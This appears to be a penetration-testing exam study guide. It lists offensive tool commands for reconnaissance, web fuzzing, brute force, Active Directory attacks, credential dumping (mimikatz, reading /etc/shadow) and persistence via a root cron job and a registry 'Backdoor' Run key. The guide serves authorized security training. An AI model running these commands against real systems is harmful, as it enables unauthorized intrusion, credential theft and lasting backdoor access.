Exam Step-by-Step Guide

---

## 1. Reconnaissance & Enumeration

**Goal:** Find as much info as possible about your target before touching it directly.

### Passive Recon (No interaction with target)
- **theHarvester**: Gathers emails, subdomains, hosts from public sources.
```bash
theHarvester -d target.com -b all -f theharvester-output.txt
```
*What to look for:* Emails, subdomains, hosts.  
*What to do next:* Use found subdomains/hosts for further scanning. Use emails for phishing (if in scope) or OSINT.

- **whois**: Shows who owns the domain, DNS servers, etc.
```bash
whois target.com > whois-output.txt
```
*What to look for:* Registrant info, DNS servers, important dates.  
*What to do next:* Use DNS servers for zone transfer attempts. Use registrant info for OSINT.

- **crt.sh**: Search for SSL certificates and subdomains.
  - Visit: https://crt.sh/?q=target.com
*What to look for:* Subdomains, alternative names.  
*What to do next:* Add subdomains to your scan list.

- **Shodan/Censys**: Find exposed services/devices.
  - Visit: https://www.shodan.io/search?query=target.com
*What to look for:* Open ports, exposed services, banners.  
*What to do next:* Target interesting services in active recon.

### Active Recon (Directly interacts with target)
- **nmap**: Finds open ports, services, versions, and OS.
```bash
nmap -sC -sV -A -T4 target.com -oN nmap-output.txt
nmap -p- target.com -oN nmap-full-output.txt  # Scan all ports
nmap --script vuln target.com -oN nmap-vuln-output.txt  # Vulnerability scan
```
*What to look for:* Open ports, service versions, OS details, vulnerabilities.  
*What to do next:* For web ports (80/443), move to web testing. For SMB/FTP/SSH, move to network testing. For high/unknown ports, research the service.

- **rustscan**: Fast port scan.
```bash
rustscan -a target.com -- -sV -O | tee rustscan-output.txt
```
*What to look for:* Open ports.  
*What to do next:* Use results to focus nmap scans or other enumeration.

- **masscan**: Super fast port scanner.
```bash
masscan -p1-65535 target.com --rate=10000 -oG masscan-output.txt
```
*What to look for:* Open ports.  
*What to do next:* Use results to guide nmap or service-specific scans.

- **dig/nslookup/host**: DNS queries.
```bash
dig target.com > dig-output.txt
nslookup target.com > nslookup-output.txt
host target.com > host-output.txt
```
*What to look for:* IP addresses, DNS records, subdomains.  
*What to do next:* Add found hosts to your scan list.

- **Subdomain Enumeration**
```bash
dnsenum target.com > dnsenum-output.txt
subfinder -d target.com -o subfinder-output.txt
amass enum -d target.com -o amass-output.txt
assetfinder --subs-only target.com > assetfinder-output.txt
```
*What to look for:* New subdomains, alternate hosts.  
*What to do next:* Scan new subdomains for open ports and services.

- **Zone Transfer**
```bash
dig axfr @ns1.target.com target.com > dig-axfr-output.txt
```
*What to look for:* Full DNS zone data (all subdomains/hosts).  
*What to do next:* Add all found hosts to your scan and attack list.

- **Banner Grabbing**
```bash
nc -nv target.com 80 > nc-banner-output.txt
telnet target.com 80 | tee telnet-banner-output.txt
```
*What to look for:* Service banners, version info, custom messages.  
*What to do next:* Use version info for vulnerability research or targeted exploits.

**What to do next:**
- Save all outputs to files (e.g., `nmap -oN nmap.txt`).
- If you see web ports, move to web testing. If you see SMB/FTP/SSH, move to network testing.

**Exam Tips:**
- Always save your output.
- If stuck, move on and come back later.

---

## 2. Web Application Testing

**Goal:** Find vulnerabilities in web apps (directories, files, SQLi, XSS, etc.).

- **Directory Brute-Forcing**
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ -o ffuf-output.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://target.com/FUZZ -o ffuf-large-dirs-output.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://target.com/FUZZ -o ffuf-large-files-output.txt

gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -o gobuster-output.txt

# Login Brute-Forcing (POST)
ffuf -w /usr/share/wordlists/usernames.txt:USER -w /usr/share/wordlists/passwords.txt:PASS -u http://target.com/login -X POST -d 'username=USER&password=PASS' -H 'Content-Type: application/x-www-form-urlencoded' -o ffuf-login-output.txt

# VHost Fuzzing
ffuf -w /usr/share/wordlists/vhosts.txt -u http://target.com -H 'Host: FUZZ.target.com' -o ffuf-vhost-output.txt

# Parameter Fuzzing
ffuf -w /usr/share/wordlists/params.txt -u 'http://target.com/page?FUZZ=test' -o ffuf-param-output.txt

# Header Fuzzing
ffuf -w /usr/share/wordlists/headers.txt -u http://target.com -H 'FUZZ: test' -o ffuf-header-output.txt
```
*What to look for:* 200/403/401 status codes, interesting directories/files, valid logins, vhosts, parameters, or headers.  
*What to do next:* Visit found URLs, try to access restricted areas, test for vulnerabilities, or escalate access.

- **Parameter Discovery**
```bash
arjun -u http://target.com/page -oT arjun-output.txt
paramspider -d target.com | tee paramspider-output.txt
```
*What to look for:* Parameters in URLs (e.g., ?id=, ?user=).  
*What to do next:* Test discovered parameters for SQLi, XSS, LFI, etc.

- **SQL Injection**
```bash
sqlmap -u "http://target.com/page?id=1" --dbs -o --batch --output-dir=sqlmap-output
sqlmap -r request.txt --batch --risk=3 --level=5 -o --output-dir=sqlmap-advanced-output
```
*What to look for:* Database names, tables, extracted data.  
*What to do next:* Dump tables, look for credentials, escalate access.

- **XSS Testing**
```bash
dalfox url http://target.com -o dalfox-output.txt
xsstrike -u http://target.com | tee xsstrike-output.txt
```
*What to look for:* Reflected input, alert popups, script execution.  
*What to do next:* Try to steal cookies, escalate privileges, or bypass controls.

- **Cookie Tampering**
```bash
curl http://domain.com/cookie-test
curl https://domain.com/cookie-test

curl -H "Cookie: logged_in=true; admin=false" http://domain.com/cookie-test
curl -H "Cookie: logged_in=true; admin=false" https://domain.com/cookie-test

curl -H "Cookie: logged_in=true; admin=true" http://domain.com/cookie-test
curl -H "Cookie: logged_in=true; admin=true" https://domain.com/cookie-test
```
*What to look for:* Changes in access, privilege escalation, or bypassed restrictions.  
*What to do next:* Try to access admin-only features, escalate privileges, or bypass authentication.

- **Vulnerability Scanning**
```bash
nikto -h http://target.com -o nikto-output.txt
wpscan --url http://target.com --enumerate u,p -o wpscan-output.txt
nuclei -u http://target.com -o nuclei-output.txt
```
*What to look for:* Vulnerabilities, outdated software, weak plugins, user accounts.  
*What to do next:* Exploit found vulnerabilities or weak points.

- **Web Crawling**
```bash
gospider -s http://target.com -o gospider-output.txt
hakrawler -url http://target.com | tee hakrawler-output.txt
```
*What to look for:* Hidden endpoints, JS files, API routes.  
*What to do next:* Add new endpoints to your testing list.

- **File Upload Bypass**
  - Try uploading `.php`, `.php.jpg`, `.phtml`, or use Burp to change Content-Type.
*What to look for:* Successful upload, file execution, bypassed restrictions.  
*What to do next:* Try to get code execution or a shell.

- **Disable JavaScript** in browser dev tools to bypass client-side validation.
*What to look for:* Ability to submit forms or upload files without client-side checks.  
*What to do next:* Try to bypass restrictions and upload malicious files.

**What to do next:**
- Visit found URLs in browser.
- Try default creds or brute force login.
- Test file uploads.

**Exam Tips:**
- Try all HTTP methods (GET, POST, PUT, DELETE, etc.).
- Look for hidden fields, parameter pollution, and bypasses.

---

## 3. Network Penetration Testing

**Goal:** Attack network services (SMB, FTP, SNMP, RDP, SSH, etc.).

- **SMB Enumeration**
```bash
enum4linux -a target.com | tee enum4linux-output.txt
smbclient -L //target.com/ | tee smbclient-output.txt
crackmapexec smb target.com -u user -p /usr/share/wordlists/rockyou.txt | tee crackmapexec-output.txt
```
*What to look for:* Shares, users, permissions, anonymous access.  
*What to do next:* Try to access shares, enumerate users, attempt password attacks.

- **FTP Brute Force**
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://target.com -o hydra-ftp-output.txt
medusa -u user -P /usr/share/wordlists/rockyou.txt -h target.com -M ftp | tee medusa-ftp-output.txt
```
*What to look for:* Valid credentials, successful logins.  
*What to do next:* Log in to FTP, look for sensitive files, upload a webshell if possible.

- **SSH Brute Force**
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com -o hydra-ssh-output.txt
medusa -u user -P /usr/share/wordlists/rockyou.txt -h target.com -M ssh | tee medusa-ssh-output.txt
```
*What to look for:* Valid credentials, successful logins.  
*What to do next:* Log in to SSH, enumerate the system, escalate privileges.

- **SNMP Enumeration**
```bash
snmpwalk -v2c -c public target.com > snmpwalk-output.txt
```
*What to look for:* System info, user accounts, network config.  
*What to do next:* Use info for further attacks or lateral movement.

- **RDP Brute Force**
```bash
hydra -t 4 -V -f -l user -P /usr/share/wordlists/rockyou.txt rdp://target.com -o hydra-rdp-output.txt
xfreerdp /u:user /p:pass /v:target.com | tee xfreerdp-output.txt
```
*What to look for:* Valid credentials, successful logins.  
*What to do next:* Log in to RDP, enumerate the system, escalate privileges.

- **Traffic Sniffing**
```bash
tcpdump -i eth0 -w capture.pcap
wireshark # Save the capture from the GUI as needed
mitmproxy -m transparent | tee mitmproxy-output.txt
```
*What to look for:* Credentials, session tokens, sensitive data in traffic.  
*What to do next:* Use captured data for further attacks or credential reuse.

**What to do next:**
- If you get credentials, try them everywhere.
- Analyze captured traffic for creds or sensitive data.

**Exam Tips:**
- Don't waste time brute-forcing if it's not working.
- Check for low-hanging fruit first (default creds, public shares, etc.).

---

## 4. Active Directory Exploitation

**Goal:** Enumerate and attack AD environments (BloodHound, kerberoasting, AS-REP roasting, etc.).

- **BloodHound Collection**
```bash
neo4j console & bloodhound &  # Start services
SharpHound.exe -c all > sharphound-output.txt  # Collect data on Windows
```
*What to look for:* User/computer relationships, attack paths, high-privilege users.  
*What to do next:* Identify attack paths, target privileged accounts for escalation.

- **Kerberoasting**
```bash
GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x > getuserspns-output.txt
```
*What to look for:* Service account hashes.  
*What to do next:* Crack hashes with hashcat/john, try resulting passwords.

- **AS-REP Roasting**
```bash
GetNPUsers.py domain/ -usersfile users.txt -no-pass > getnpusers-output.txt
```
*What to look for:* Hashes for users without pre-auth.  
*What to do next:* Crack hashes, try resulting passwords.

- **Windows Enumeration**
```bash
net user /domain > netuser-output.txt
net group "Domain Admins" /domain > netgroup-output.txt
dsquery * -limit 100 > dsquery-output.txt
```
*What to look for:* Usernames, group memberships, admin accounts.  
*What to do next:* Target admins for attacks, try password reuse.

- **Lateral Movement**
```bash
PsExec.exe \\target.com -u user -p pass cmd > psexec-output.txt
wmiexec.py domain/user:pass@target.com > wmiexec-output.txt
```
*What to look for:* Successful remote command execution.  
*What to do next:* Use new access to escalate privileges or dump more credentials.

**What to do next:**
- Crack dumped hashes (see next section).
- Use found creds for lateral movement.

**Exam Tips:**
- Document all users, groups, and shares you find.
- Try all credentials everywhere.

---

## 5. Exploitation & Post-Exploitation

**Goal:** Get a shell and escalate privileges to root/Administrator. Dump credentials, establish persistence, and recon again.

- **Linux Privilege Escalation**
```bash
./linpeas.sh > linpeas-output.txt
find / -perm -4000 2>/dev/null > suid-output.txt
crontab -l > crontab-output.txt
```
*What to look for:* SUID binaries, cron jobs, kernel exploits, misconfigurations.  
*What to do next:* Try privilege escalation exploits, check for writable SUID files or cron jobs.

- **Windows Privilege Escalation**
```bash
winPEAS.exe > winpeas-output.txt
```
*What to look for:* Misconfigurations, vulnerable services, credentials.  
*What to do next:* Use findings to escalate privileges.

- **Credential Dumping**
```bash
mimikatz > mimikatz-output.txt
secretsdump.py -just-dc-user domain/user:pass@dc-ip > secretsdump-output.txt
samdump2 > samdump2-output.txt
cat /etc/shadow > shadow-output.txt
```
*What to look for:* Password hashes, cleartext credentials.  
*What to do next:* Crack hashes, use credentials for lateral movement or privilege escalation.

- **Persistence**
```bash
echo "* * * * * root /tmp/rev.sh" >> /etc/crontab
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
```
*What to look for:* Ability to maintain access after reboot.  
*What to do next:* Set up persistence only if allowed by exam rules.

- **Host Recon**
```bash
whoami > whoami-output.txt
hostname > hostname-output.txt
ipconfig /all > ipconfig-output.txt
ifconfig > ifconfig-output.txt
ps aux > ps-output.txt
tasklist > tasklist-output.txt
netstat -ano > netstat-output.txt
```
*What to look for:* User context, running processes, network connections.  
*What to do next:* Identify interesting processes, connections, or users for further exploitation.

### Password Cracking Tools

#### Hydra
Hydra is a fast and flexible login cracker supporting numerous protocols.

**Common Usage Examples:**
```bash
# SSH Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com -o hydra-ssh-output.txt
# FTP Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://target.com -o hydra-ftp-output.txt
# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://target.com/login -o hydra-http-output.txt
# RDP Brute Force
hydra -t 4 -V -f -l user -P /usr/share/wordlists/rockyou.txt rdp://target.com -o hydra-rdp-output.txt
# SMB Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt smb://target.com -o hydra-smb-output.txt
# MySQL Brute Force
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://target.com -o hydra-mysql-output.txt
```
*What to look for:* Successful logins, valid credentials.  
*What to do next:* Use credentials to access services, escalate privileges, or pivot.

#### Hashcat
Hashcat is a powerful password recovery tool for cracking hashes.

**Common Usage Examples:**
```bash
# Crack an MD5 hash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o hashcat-md5-cracked.txt
# Crack a SHA1 hash
hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o hashcat-sha1-cracked.txt
# Crack a NTLM hash
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o hashcat-ntlm-cracked.txt
# Crack a bcrypt hash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o hashcat-bcrypt-cracked.txt
# Crack a ZIP file hash
hashcat -m 13600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o hashcat-zip-cracked.txt
# Crack with rules
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule -o hashcat-md5-rules-cracked.txt
```
*What to look for:* Cracked passwords in output file.  
*What to do next:* Use passwords for escalation, lateral movement, or reporting.

#### John the Ripper
John the Ripper is a fast password cracker, primarily for Unix-based systems.

**Common Usage Examples:**
```bash
# Basic usage
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --pot=john-pot.txt
# Crack a shadow file
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt --pot=john-pot.txt
# Crack a ZIP file
zip2john secret.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash --pot=john-pot.txt
# Crack a Windows NTLM hash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hash.txt --pot=john-pot.txt
# Show cracked passwords
john --show hash.txt --pot=john-pot.txt > john-show-output.txt
```
*What to look for:* Cracked passwords in output or pot file.  
*What to do next:* Use passwords for escalation, lateral movement, or reporting.

**What to do next:**
- Use cracked passwords to escalate or pivot.
- Try all found credentials everywhere.

**Exam Tips:**
- Document every credential and hash you find.
- Try multiple tools if one doesn't work.

---

## 6. Reporting & Time Management

**Goal:** Show what you found, how you found it, and how to fix it. Manage your time and notes for the exam.

- **Take screenshots** of every step (e.g., `gnome-screenshot`, `scrot`).
- **Write down**:
  - What you did
  - What you found
  - How to reproduce
  - How to fix
- **Prepare a report** with:
  - Vulnerability title
  - Impact/description
  - Steps to reproduce
  - Evidence (screenshots, output)
  - Mitigation

**Time Management Tips:**
- Triage: Identify high-value targets first
- Timebox: Don't get stuck—move on and return later
- Document as you go

---

## Exam Day Checklist

- [ ] Enumerate all hosts and services (nmap, rustscan, masscan)
- [ ] Perform passive recon (whois, theHarvester, crt.sh)
- [ ] Enumerate DNS, subdomains, and try zone transfer
- [ ] Web: Test for OWASP Top 10, file upload, bypasses
- [ ] Network: Enumerate SMB, FTP, SNMP, RDP, SSH
- [ ] Attempt password attacks where applicable
- [ ] AD: Run BloodHound, try kerberoasting, AS-REP roasting
- [ ] After initial access: enumerate for privilege escalation
- [ ] Dump credentials, look for persistence opportunities
- [ ] Take notes/screenshots for every step
- [ ] Prepare clear, concise report with evidence
- [ ] Manage time—move on if stuck, revisit later

---
